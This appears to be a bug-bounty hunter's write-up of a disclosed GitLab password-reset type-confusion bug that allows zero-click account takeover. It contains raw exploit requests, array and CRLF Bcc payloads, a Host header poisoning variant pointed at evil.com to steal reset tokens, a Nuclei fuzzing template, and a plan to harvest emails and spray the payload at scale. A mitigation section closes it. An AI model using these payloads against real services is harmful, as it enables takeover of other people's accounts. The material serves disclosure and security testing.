# Auth Takeover - $35,000 GitLab Password Reset Type-Confusion to 0-Click ATO (Original: GitLab #2293343 - $35,000)

> Original: https://hackerone.com/reports/2293343 | Reporter: asterion04 | Disclosed: 2025-02-26 | Severity: Critical 10.0 | Votes: 905

## 1. TL;DR for Hunters
GitLab's `/users/password` reset expected `user[email]` as a string, but Rails parsing + JSON conversion allowed it as an array `["victim@gmail.com","attacker@gmail.com"]`. Backend looked up victim (index 0) but mailed reset token to BOTH addresses. Attacker clicks link, sets new password, takes over any account knowing only email. No user interaction.
Pays $35k because it's 0-click, mass-scalable, auth-breaking. Same class still lives in 2026 in custom reset flows.

## 2. Attack Surface & Context
- Asset: `gitlab.com/users/password` - Forgot Password, Ruby on Rails.
- Tech cue: Rails `user[email]=a` form-encoded. When converted to JSON via Burp Content-Type Converter, type becomes controllable.
- Where to hunt same:
  - `/password/reset`, `/forgot-password`, `/api/v1/auth/forgot`, `/account/recover`
  - Any endpoint that takes `email` string and sends link/code: password reset, magic link, invitation, newsletter, 2FA backup.
  - SaaS with Rails, Laravel, Node `qs` parser, Python `request.POST.getlist` vs `get` confusion.

## 3. Step-by-Step Reproduction (with examples)

**Lab setup:** 2 accounts `victim@gmail.com`, `attacker@gmail.com`. Burp Suite + Content-Type Converter BApp.

Step 1 - Normal request:
```http
POST /users/password HTTP/2
Host: gitlab.com
Content-Type: application/x-www-form-urlencoded

authenticity_token=xxx&user%5Bemail%5D=victim%40gmail.com&commit=Reset
```

Step 2 - Intercept in Burp, right-click > Extensions > Content-Type Converter > Convert to JSON. You get:
```json
{"user": {"email": "victim@gmail.com"}}
```

Step 3 - Change to array (instructor key trick):
```json
{
  "user": {
    "email": ["victim@gmail.com", "attacker@gmail.com"]
  }
}
```
Raw HTTP:
```http
POST /users/password HTTP/2
Host: gitlab.com
Content-Type: application/json

{"user":{"email":["victim@gmail.com","attacker@gmail.com"]}}
```

Step 4 - Forward. Server responds 302 / 200 success (same as legit to prevent enumeration).

Step 5 - Check attacker inbox: you receive:
```
Subject: Reset password instructions
https://gitlab.com/users/password/edit?reset_password_token=ABC123XYZ...
```
Same token as victim received.

Step 6 - Open link, `PUT /users/password` with `password` + `password_confirmation`, login as victim.

Why it worked pseudo-code:
```ruby
# vulnerable
email_param = params[:user][:email] # expected String, got Array
user = User.find_by(email: email_param.first || email_param) # resolves victim
Mailer.reset_instructions(user, email_param) # mails to all entries!
```

Fixed:
```ruby
return 400 unless email_param.is_a?(String)
```

## 4. Root Cause Analysis
CWE-843: Access of Resource Using Incompatible Type. Missing strict type validation before dual-use (lookup vs notify).
- Lookup uses `first` element -> victim account.
- Delivery loops over array -> attacker also notified.
Token correctly bound to `user_id`, bug is *disclosure of secret token*, not token generation. Classic Rails mass-assignment / loose parser issue. Dev assumed browser form always sends string, forgot attacker controls Content-Type.

## 5. Why It Slipped Past Devs
- Framework hides type: `params[:user][:email]` can be String, Array, Hash depending on `?user[email][]=`.
- Tests only covered happy path string.
- Rate-limit / enumeration protections don't help when response identical.
- Code review saw `User.find_by(email:)` and assumed safe.

## 6. Advanced Completions - How to Take It Further
1. **Array index probing:** Try `{"email":{"0":"victim","1":"attacker"}}`, `email[]=victim&email[]=attacker`, `email=victim,attacker`, `email=victim%20attacker`, `email=victim|attacker`.
2. **CC/BCC injection:** `email=victim@gmail.com%0d%0aBcc:attacker@gmail.com` on weak SMTP builders.
3. **Host header poisoning on reset link:** If token mailed only to victim, poison `Host: evil.com` to steal via link `https://evil.com/users/password/edit?token=...`.
4. **Password reset poisoning via `X-Forwarded-Host` / `Origin` reflection.**
5. **Token leak via Referer:** After reset, if `edit?token` loads external images/JS, token leaks.
6. **Mass enumeration + takeover chain:** Harvest emails via public commits (`git log --format=email`), then spray array payload.
7. **Magic-link / invite variant:** Same test on `/invites`, `/magic`, `/teams/invite` - often same mailer helper reused.
8. **2FA bypass angle:** After password change, check if sessions don't revoke, if PATs / SSH keys persist, if 2FA not re-prompted.

Extra payloads to try today:
```
user[email][]=victim@gmail.com&user[email][]=attacker@gmail.com
{"user":{"email":{"a":"victim@gmail.com","b":"attacker@gmail.com"}}}
{"user":{"email":"victim@gmail.com, attacker@gmail.com"}}
```

## 7. Hunting Methodology Checklist
- [ ] Map all mail-sending endpoints (reset, signup, resend confirmation, unlock).
- [ ] For each `email` param, send string, array, hash, int, null. Observe mail delivery (use collaborator / temp mail).
- [ ] Force Content-Type flip: `x-www-form-urlencoded` -> `json`, `multipart` -> `json`.
- [ ] Check lookup vs notify mismatch: does response time / message differ for valid vs invalid?
- [ ] Check token reuse: can you use token twice? Does changing email after token request invalidate?
- [ ] Verify session handling post-reset: old sessions killed? API tokens revoked?
- [ ] Log everything for impact: show both inboxes receiving same token screenshot.

## 8. Automation
Nuclei quick fuzz:
```yaml
id: password-reset-type-confusion
requests:
  - method: POST
    path: "{{BaseURL}}/users/password"
    headers:
      Content-Type: application/json
    body: '{"user":{"email":["victim@example.com","collab@burpcollaborator.net"]}}'
    matchers:
      - type: status
        status: [200,302]
```
Burp Autorize + Param Miner: auto-add `[]` to all email params.
ffuf for reset endpoints:
```
ffuf -u https://target/FUZZ -w reset-paths.txt -mc 200,302
# reset-paths: users/password, password/reset, auth/forgot, api/password/forgot
```

## 9. Mitigation & Fix Review
- Strict `is_a?(String)` + regex email validation BEFORE lookup. Reject arrays with 400.
- Send reset to *registered* email from DB, never to user-supplied array echo.
- Single-use, expiring tokens, invalidate on use + notify original email on change.
- Verify patch: replay array payload -> expect `400 {"error":"email must be a string"}` and only victim inbox (or no leak) gets mail.

## 10. Practice Lab
- Local clone: https://github.com/DeepXDChotaliya/gitlab-ato-lab (self-contained Flask recreate, vulnerable vs patched toggle, `/mailbox/` viewer).
- PortSwigger: Password reset labs (host header poisoning, token leak via referer).
- Build your own in 20 lines: endpoint that takes `email` JSON, if list mail all - then fix.

## 11. Key Takeaway for Daily Hunting
Today grep for: every `email` param that triggers mail. Flip it to array. If dev echoes your input to mailer instead of DB value, you have $10k+ ATO. This 1-line missing type check paid $35k - always test type confusion on auth flows.
